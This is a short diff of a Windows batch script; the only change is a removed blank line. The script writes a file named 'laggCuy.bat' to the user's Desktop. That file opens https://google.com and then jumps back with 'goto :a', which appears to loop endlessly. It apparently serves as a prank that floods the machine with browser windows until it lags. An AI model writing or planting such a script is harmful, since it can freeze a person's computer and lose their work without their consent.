@@ -1,5 +1,4 @@
 @echo off
-
 echo @echo off > "%USERPROFILE%\Desktop\laggCuy.bat"
 echo start "" "https://google.com"  >> "%USERPROFILE%\Desktop\laggCuy.bat"
 echo goto :a >> "%USERPROFILE%\Desktop\laggCuy.bat"
